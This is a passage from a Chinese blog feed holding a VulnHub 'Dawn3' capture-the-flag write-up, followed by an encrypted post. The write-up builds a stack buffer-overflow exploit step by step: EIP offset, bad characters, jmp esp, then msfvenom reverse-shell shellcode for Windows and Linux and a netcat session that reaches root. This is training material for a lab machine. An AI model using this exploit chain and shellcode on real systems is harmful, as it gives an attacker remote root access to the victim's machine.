class="hljs-string">&#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9&#x27;</span><br>        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>        s.connect((&quot;<span class="hljs-number">192.1</span>.<span class="hljs-number">1.155</span>&quot;,<span class="hljs-number">6812</span>))<br>        s.send(buffer)<br>        s.close()<br><br>        size+=100<br>        time.sleep(3)<br><br>except:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[+] Could not connect.&quot;</span><br>        sys.exit()<br><br></code></pre></td></tr></table></figure><p>再次查看 Immunity Debugger</p><p><img src="/pic/b279ea7135cbc0637731da6602bf63c8_MD5.png"></p><p>EIP 的值，也就是指向下一条指令的地址。控制了这个位置，我们就挟持了程序的执行流</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ msf-pattern_offset -l 600 -q 35724134<br>[*] Exact match at offset 524<br></code></pre></td></tr></table></figure><p>也就是说在 524 位置处出现了缓冲区溢出到 EIP 寄存器中，我们可以通过指定前 524 个字符为 A，中间四个字符为 B，后面跟 72 个 C，这样的 600 字符作为输入，来查看 EIP 的值是否是 42（B 的十六进制是 42）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">buffer = <span class="hljs-string">&#x27;A&#x27;</span>*524 + <span class="hljs-string">&#x27;B&#x27;</span>* 4 + <span class="hljs-string">&#x27;C&#x27;</span>*72<br></code></pre></td></tr></table></figure><p>代码上只需要修改 buffer 就行</p><p><img src="/pic/7645ab7f619c774e6ec6b309166c5126_MD5.png"></p><p>这样我们就彻底确定了 EIP 值的可控性</p><p>接下来需要判断 ESP 的容量，因为我们之后要把代码放入其中。修改 buffer 的值，我们看看 C 字符在堆栈信息中的首尾值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">buffer = <span class="hljs-string">&#x27;A&#x27;</span>*524 + <span class="hljs-string">&#x27;B&#x27;</span>* 4 + <span class="hljs-string">&#x27;C&#x27;</span>*600<br></code></pre></td></tr></table></figure><p>相减得到容量字节数为 492，是足够我们存放代码的</p><p><img src="/pic/f2cf72b123acc1419dd5e82522b412e5_MD5.png"></p><p>下一步我们要确定是否有坏字节的问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ git <span class="hljs-built_in">clone</span> https://github.com/cytopia/badchars.git<br>Cloning into <span class="hljs-string">&#x27;badchars&#x27;</span>...<br>remote: Enumerating objects: 68, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (68/68), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (48/48), <span class="hljs-keyword">done</span>.<br>remote: Total 68 (delta 26), reused 46 (delta 15), pack-reused 0<br>Receiving objects: 100% (68/68), 29.01 KiB | 430.00 KiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (26/26), <span class="hljs-keyword">done</span>.<br><br>┌──(kali㉿kali)-[~/Downloads/dawn3/badchars]<br>└─$ ./badchars -f ruby<br>badchars = (<br>  <span class="hljs-string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</span> +<br>  <span class="hljs-string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span> +<br>  <span class="hljs-string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;</span> +<br>  <span class="hljs-string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span> +<br>  <span class="hljs-string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span> +<br>  <span class="hljs-string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span> +<br>  <span class="hljs-string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span> +<br>  <span class="hljs-string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span> +<br>  <span class="hljs-string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span> +<br>  <span class="hljs-string">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span> +<br>  <span class="hljs-string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span> +<br>  <span class="hljs-string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span> +<br>  <span class="hljs-string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span> +<br>  <span class="hljs-string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span> +<br>  <span class="hljs-string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span> +<br>  <span class="hljs-string">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>将其复制到脚本文件中，然后修改 buffer 的值</p><p><img src="/pic/12a3c7e31855dd85bc1b8cde099e69cd_MD5.png"></p><p>可以看到整齐得排列，证明了没有坏字节</p><p><img src="/pic/c85584b52be01e8dd3d0bd20c254db1d_MD5.png"></p><p>接下来是考虑如何定位 ESP 的位置，因为在程序运行前 ESP 的位置是不确定的，我们希望通过 EIP 来重定向到 ESP，这里借助于 jump esp 语句，我们使用 msf-nasm_shell 工具来得到语句对应的操作码。我们还需要在这个程序中寻找包含 <code>jmp esp</code> 指令的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Brainpan1]<br>└─$ msf-nasm_shell <br>nasm &gt; jmp esp<br>00000000  FFE4              jmp esp<br></code></pre></td></tr></table></figure><p>我们先列出所有的模块</p><p><img src="/pic/b1d17e8c84542d84adaad67a905cdeeb_MD5.png"></p><blockquote><p>从 Module info 这个列表中可以看出来有四种安全机制：<br>Rebase（重定位）：重定位是一种操作系统和程序加载器的特性，允许将共享的库和可执行文件加载到内存中的不同位置，以防止地址空间的冲突。重定位可以提高系统的安全性，防止一些攻击，如基于地址的攻击。<br>SafeSEH（安全异常处理链表）：在 Windows 操作系统中，SafeSEH 是一种保护机制，用于检测和阻止异常处理链表被利用用于漏洞利用。它可以帮助防止 SEH（Structured Exception Handling）覆盖攻击。<br>ASLR（地址空间布局随机化）：ASLR 是一种操作系统的安全特性，通过随机化加载程序和库的内存位置，来防止攻击者预测这些位置。这可以减少缓冲区溢出和代码注入等攻击的成功率。<br>NXCompat（不可执行内存保护）：NXCompat 是一种硬件和操作系统级别的安全特性，阻止内存中的数据被当作代码执行。这可以防止缓冲区溢出等漏洞被利用来执行恶意代码。</p></blockquote><p>而图片中显示四种安全机制都没有开启，那我们放心得寻找 <code>jmp esp</code> 指令的操作码所在的位置 <code>!mona find -s &quot;\xff\xe4&quot; -m dawn3.exe</code></p><p><img src="/pic/0addb661a7195dcf465891b3b5e7c84f_MD5.png"></p><p>注意这里由于目前大部分计算机采用的都是小端模式，因此这里要按字节倒序来将地址写入到 EIP 中。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">13</span>\<span class="hljs-keyword">x</span><span class="hljs-number">15</span>\<span class="hljs-keyword">x</span><span class="hljs-number">50</span>\<span class="hljs-keyword">x</span><span class="hljs-number">52</span>&#x27;<br></code></pre></td></tr></table></figure><p>接下来生成 shellcode，因为现在运行的虚拟机是 Windows 的，生成 shellcode 也得指定为 <code>windows/shell_reverse_tcp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.1.1.128 LPORT=443 -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86/shikata_ga_nai -f c<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x86 from the payload<br>Found 1 compatible encoders<br>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai<br>x86/shikata_ga_nai succeeded with size 351 (iteration=0)<br>x86/shikata_ga_nai chosen with final size 351<br>Payload size: 351 bytes<br>Final size of c file: 1506 bytes<br>unsigned char buf[] = <br><span class="hljs-string">&quot;\xbe\xa8\x70\x9a\xaa\xd9\xc3\xd9\x74\x24\xf4\x5f\x2b\xc9&quot;</span><br><span class="hljs-string">&quot;\xb1\x52\x31\x77\x12\x03\x77\x12\x83\x47\x8c\x78\x5f\x6b&quot;</span><br><span class="hljs-string">&quot;\x85\xff\xa0\x93\x56\x60\x28\x76\x67\xa0\x4e\xf3\xd8\x10&quot;</span><br><span class="hljs-string">&quot;\x04\x51\xd5\xdb\x48\x41\x6e\xa9\x44\x66\xc7\x04\xb3\x49&quot;</span><br><span class="hljs-string">&quot;\xd8\x35\x87\xc8\x5a\x44\xd4\x2a\x62\x87\x29\x2b\xa3\xfa&quot;</span><br><span class="hljs-string">&quot;\xc0\x79\x7c\x70\x76\x6d\x09\xcc\x4b\x06\x41\xc0\xcb\xfb&quot;</span><br><span class="hljs-string">&quot;\x12\xe3\xfa\xaa\x29\xba\xdc\x4d\xfd\xb6\x54\x55\xe2\xf3&quot;</span><br><span class="hljs-string">&quot;\x2f\xee\xd0\x88\xb1\x26\x29\x70\x1d\x07\x85\x83\x5f\x40&quot;</span><br><span class="hljs-string">&quot;\x22\x7c\x2a\xb8\x50\x01\x2d\x7f\x2a\xdd\xb8\x9b\x8c\x96&quot;</span><br><span class="hljs-string">&quot;\x1b\x47\x2c\x7a\xfd\x0c\x22\x37\x89\x4a\x27\xc6\x5e\xe1&quot;</span><br><span class="hljs-string">&quot;\x53\x43\x61\x25\xd2\x17\x46\xe1\xbe\xcc\xe7\xb0\x1a\xa2&quot;</span><br><span class="hljs-string">&quot;\x18\xa2\xc4\x1b\xbd\xa9\xe9\x48\xcc\xf0\x65\xbc\xfd\x0a&quot;</span><br><span class="hljs-string">&quot;\x76\xaa\x76\x79\x44\x75\x2d\x15\xe4\xfe\xeb\xe2\x0b\xd5&quot;</span><br><span class="hljs-string">&quot;\x4c\x7c\xf2\xd6\xac\x55\x31\x82\xfc\xcd\x90\xab\x96\x0d&quot;</span><br><span class="hljs-string">&quot;\x1c\x7e\x38\x5d\xb2\xd1\xf9\x0d\x72\x82\x91\x47\x7d\xfd&quot;</span><br><span class="hljs-string">&quot;\x82\x68\x57\x96\x29\x93\x30\x59\xac\x9a\x40\x31\xad\x9c&quot;</span><br><span class="hljs-string">&quot;\x41\x79\x38\x7a\x2b\x6d\x6d\xd5\xc4\x14\x34\xad\x75\xd8&quot;</span><br><span class="hljs-string">&quot;\xe2\xc8\xb6\x52\x01\x2d\x78\x93\x6c\x3d\xed\x53\x3b\x1f&quot;</span><br><span class="hljs-string">&quot;\xb8\x6c\x91\x37\x26\xfe\x7e\xc7\x21\xe3\x28\x90\x66\xd5&quot;</span><br><span class="hljs-string">&quot;\x20\x74\x9b\x4c\x9b\x6a\x66\x08\xe4\x2e\xbd\xe9\xeb\xaf&quot;</span><br><span class="hljs-string">&quot;\x30\x55\xc8\xbf\x8c\x56\x54\xeb\x40\x01\x02\x45\x27\xfb&quot;</span><br><span class="hljs-string">&quot;\xe4\x3f\xf1\x50\xaf\xd7\x84\x9a\x70\xa1\x88\xf6\x06\x4d&quot;</span><br><span class="hljs-string">&quot;\x38\xaf\x5e\x72\xf5\x27\x57\x0b\xeb\xd7\x98\xc6\xaf\xe8&quot;</span><br><span class="hljs-string">&quot;\xd2\x4a\x99\x60\xbb\x1f\x9b\xec\x3c\xca\xd8\x08\xbf\xfe&quot;</span><br><span class="hljs-string">&quot;\xa0\xee\xdf\x8b\xa5\xab\x67\x60\xd4\xa4\x0d\x86\x4b\xc4&quot;</span><br><span class="hljs-string">&quot;\x07&quot;</span>;<br></code></pre></td></tr></table></figure><p>使用生成的代码是进行了混淆和编码的，需要留出解码的空间位置（填充物，填充未使用的缓冲区，用于控制溢出地址的位置，一般使用 nop 指令填充——0x90 表示。）。修改代码为：</p><p><img src="/pic/eb084e58579ecef03626040b5db66377_MD5.png"></p><p>提前开启监听，反弹 shell 成功</p><p><img src="/pic/a67608c2ac91ab4fe157c9223222ddfe_MD5.png"></p><p>我们前期信息收集已经得知了目标是 Linux，所以我们需要把 shellcode 修改为 Linux 的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.106 LPORT=443 -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86/shikata_ga_nai -f c<br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x86 from the payload<br>Found 1 compatible encoders<br>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai<br>x86/shikata_ga_nai succeeded with size 95 (iteration=0)<br>x86/shikata_ga_nai chosen with final size 95<br>Payload size: 95 bytes<br>Final size of c file: 425 bytes<br>unsigned char buf[] = <br><span class="hljs-string">&quot;\xd9\xcd\xbd\xc2\x91\xc4\x0b\xd9\x74\x24\xf4\x58\x2b\xc9&quot;</span><br><span class="hljs-string">&quot;\xb1\x12\x31\x68\x17\x03\x68\x17\x83\x2a\x6d\x26\xfe\x9b&quot;</span><br><span class="hljs-string">&quot;\x55\x50\xe2\x88\x2a\xcc\x8f\x2c\x24\x13\xff\x56\xfb\x54&quot;</span><br><span class="hljs-string">&quot;\x93\xcf\xb3\x6a\x59\x6f\xfa\xed\x98\x07\x3d\xa5\x63\xbd&quot;</span><br><span class="hljs-string">&quot;\xd5\xb4\x93\x40\x9d\x30\x72\xf2\x87\x12\x24\xa1\xf4\x90&quot;</span><br><span class="hljs-string">&quot;\x4f\xa4\x36\x16\x1d\x4e\xa7\x38\xd1\xe6\x5f\x68\x3a\x94&quot;</span><br><span class="hljs-string">&quot;\xf6\xff\xa7\x0a\x5a\x89\xc9\x1a\x57\x44\x89&quot;</span>;<br></code></pre></td></tr></table></figure><p>注意修改 IP 为目标靶机的 IP，修改后的代码为</p><p><img src="/pic/e8755f53df670aa3635bbd461148a4dc_MD5.png"></p><h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>提前开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.148] 59420<br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span>                                                                                                                  <br>root.txt                                                                                                            <br><span class="hljs-built_in">cat</span> root.txt                                                                                                        <br>Thanks <span class="hljs-keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)<br><br>3ca74b4afc790b46ff47fc2db5676b4f<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>root@dawn3:/root<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:06:69:f3 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.148/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 439sec preferred_lft 439sec<br>    inet6 fe80::a00:27ff:fe06:69f3/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@dawn3:/root<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux dawn3 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux</span><br>root@dawn3:/root<span class="hljs-comment"># sudo -l</span><br>sudo -l<br>bash: sudo: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure><p>直接就是 root，结束战斗</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1dY4y127Ld/?vd_source=a057ab968fb9ba52d239d40c767cc40c">「红队笔记」靶机精讲：Brainpan1 - 缓冲区溢出典型利用过程，让你一次吃透。_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/read/cv25686993/">SUNSET: DAWN3 打靶过程 - 哔哩哔哩 (bilibili.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Analytics</title>
    <link href="/2023/10/2756aae2067b.html"/>
    <url>/2023/10/2756aae2067b.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7be048040dadcbe379b69d9fd9167ba0cd147b58949549242b4d434a777edcd8">91c22b0949579c4c6d0a72472c3796005314198df07df9cbbc9ef35e105a966001b7aa3d9a90cc7779d048b5d75589ad5b08267d29cec400a3853fb9415aa022772dcb97c850a1cc7de8f35566ac64780b67b55ab75391fdc27c67824076b6db70bab0889bf92c8cdfe4da4f411728e8e1ad170eef25425be020f35677a66f0ff727c31d9a820b4bee16b3f740e844588fcda8fcd7dcc94df6b7c12620daf4a4be3b618b210436099161819a120a0a892e3ea51b028353da5d6920602679444431e73f4c186483eed1b90ed4eaa0b22825f018f4342fc50be41a19b70e7938b6ca214795eda41ad60a7ed707471b36a47e398225b77ed0ed3de3d9cc79e2a06894ef7d08ff605173d71ae90a62fcef85d4521ff6869b553e96c6d0dbdb950ed12ade25d964eaa8d6f2355fc4c4630402361dcdd012478ef2cb52d4518c8acea9906de6934d198dbacc12a0e436c8be4cd2e01e54644b5641b688c68b9bef684436f1416dfed943bfafa00e903b0f70a9ba07fbeac7402092bfe39048f9ef6b601660abf4d812314530f975ac0cb094bbdaf34a080fc426c926c19c97c467d7580c0e81306010e2ed8b7ce18864a37275faf7e70f46624f642d1db46b379fc5e103fc1b9c9fa8a4a0305bbf1c0f81fc2ce2c14ac647fa248ef024afba0def954b2897fa7289a02168c8f8703859367092f11bb1cfd79785a6c7f71ad00a0917f4c85d3a3af18e243800e444eb01394686de0f58b6cbf6c8051469d7bfcd2b611084e649a2a6594a5a890eefc2965d183cd6a45f6faee823a02e2c6807b6e1125ff8205f7e21eddca8ca46f18be19eb4ca70bf7bf00025a99659f0c12ada7424c9c3161d9028d5a987819d76989318ef4710212e3ac62000d18db20da099f6a9ccbf3d7731961c0edc70cfd4ae68acd7dfa7a514b313fbefc51a6991312bc17aecbeafc45496053a651b8bb7e4d5d739992b679cff9a8513bbba4ee4df121aae32137d2074afb15023beb27f4e30af4cb532536b676dc2f996c19c31757196460cd52b6fdb4831f69f5ab5269ee64719be536c5daa5972488c2dd25d7c73398d71752c8dd447e03cbb87457701d380a40eb1e8909b1221f1ef5a82db99814b3410af1967083e0837cd6e6d3150350ba716f71a0e3cf65e522f3fbc793425be4a6b83d8e3916b59c1005c292ceb25ad6ada64b79c44a2056307778e48c0ead12a32eda7540b1bc2bb41a3a0cde388d0edb78083f385f64b321c3187158809c374c72d821dbf8db55a05534a513e0404dec780ea20552c20d7c422e0dc1615ec0174c7c89c18e6978396a77b388351379f39e0aea9cb99b2e665c2028c2a07909c40b509a0f9466fdefd9d26369a1a3b20f22fd854f67b250453bf978c233fce6a8f33ee7236d63d4dbd080f3ec7ec3ba48f6b8480fa532676dca42be2b04acfb6099451ef06dbfce49ca9dc24350a0e8fbe06dbda2328dd998f11df8bc5ff28587fad8c22befc6eeeeb233ba437a8a5ce77853bce338158535f30c556621dc46a4c88bb39e7104dae12f35aab1ef9615dcb6510dca27128311afcbb2aa4b74484cdcf28e17ebf307ff9328cc40a08a8ae1228187704dab58a20f8384d3224de7a4ab9e32bbee363b13f3110e4b3710a8b5425b5b0846b2265af00c6e6e88cb4153cf17530135f5dce0051d287a4d96ffb227aa6f48643b2f69bdd6bd1e9ad38db7b5bed526ce43303e2c0e74ca24c6a0d6aa0f4b5e95e005d971db234b05719da2d1967047bde902ac9f23cc3d0a2c0692e1f493387b3ca2d650ece869b251ff3225e013d05f6ee33cc65c9a6403e8540c03d979e2bc729e47e91c4c8274d9f2843e4764adc7dc233cbc5d0c3ac7cfc13d2c941219bc84041b80e7fe220a3600eb9154841e38041f23199e804f381a67e78d98fded07138608bf398dffe6cbef89687f4105a1d0966c9705f17ba5526785c2b5f012d19606c5ab98c12fd27615011a6838cf30f5b39455d53351f8eed0104d2ba40d181ff7290748fb8509c3206dbcceee77a0de1da3807a4b90614448d8a0c7ca616ec0cbf19de69022996802b7d843c4c08e728ddfe7f01b058d7296e1ec52beab303b4f6db1e12d3a5edd1d23ece7db1a2b440fc90c67c91feddbc63db3992a1f7087742ec472a05b2c357c30b8cb3fa2348012176158dadf3fe3f7d2aae5455e288ad771bed77bdee4f6a1d42625cbe95f498b6de26edb537bd28f94ede6457f8225bdb7e34f1a6c273667350b3421eda1ddca589547832c695fe44d56cc2c6e4089aff4f69915873a027882f854bf2ba5e78cd485e9b548ca0aa33b1b1f95769e49d742ac7808df17ac6929c5e9f05aae23e04e7047ff67580741bc770597e55d6c4cb0231f64f5c08ee7acaef8faecf706b33884fc8a3f0d80c307bd5acc91062a4c4fc16643eddb3c70b91ebc367334e69880891abce47f1cb760eabaca0393e263a18499726815c78b76555e03ceb84c4700ad5c67ba80258f1dded862d5b6e54d63e77a8a0fda6f3ac4c7223689e9c0c8362ef6eaa44ecd3742db9a6f672e8b3023c1783c3f58d0f00edaefb61a98e1d2f06e860e1d9c2f4b498673aa9631d105af66c0f7965b4d2f110862346baf45e740a90f1515ec4b0a5bb2fc01a980d4f560a2bd731e81e5f3b777953370eb1454f5c708c9ef1d880541dea030711c9211e17ea35d3ca284f3f0946f2d0e1745bb67e5611edd95d6945eb71cbf26ac86721ec7f6ec749cad5d29b593f3452d8eba2e2a21c8b21bfa5d35fd783fa43347a5d16ddc4469b9d71be409400186826962464fa7c827c712e1ff5a664686104afe3add1bf85855cfa3c224480a3f0268710d69481e91c0abbffce484d4d9baa68f3d484940f4d4c10546f7c72f1948861dd218dba67a363fe8194b44c178918f320b103833b025d2893ead8635533f0aac4f027704ab14c9e5610a6dfa0144a26069f5c9974acf9d5cc60dc501ce1cac54c5714b945f35a53d33f2cf93b71044ed9cca677bfa3d435ac57319d7435758090faa13d9050d33f18bb63eaa9e3fa49ac9856b85bd1dc1dfa83c802468e0f8016be41c98dfcc6375d23c8ac76a0b412a3f567d6ff23c098782c755ce9a2e77bd125eaefbea81e8b6d1cc4f172690d3532e161d2a0c2f2656eeabd21236879abfbaa076d24f7f4334db7012bccfff65392adf568e74e2916d1cabdb8cf1f5ac71f624729690715eaef4026bcf04956b3e849fc6f276ccc9e27cabd7a4110d5afe2fa05501dd566e5dea4d3bf9ebb70c960aa08fc06a8d84fadc8f6e7dc37d8f76959881312e302818278dc435d1387f5f9a21e09016164a2b9b04d524f288279d51d699e004b8ace87ddd26f9d89a3d22205f8854604cad0eafae14f7ea5cf5ce2a02137c3a8c1b34f8172f331dfd8edadc8637a0d61104761a87084659df24a9b5036c3eeea0fd1c8a5c8ac70e2b57c9e8fd1aa21189568b80f61f795f8e4bd6b73eac45003e8155bd2c17ab147027538e71dcfed76eaae9434f763f6f7ff9ba49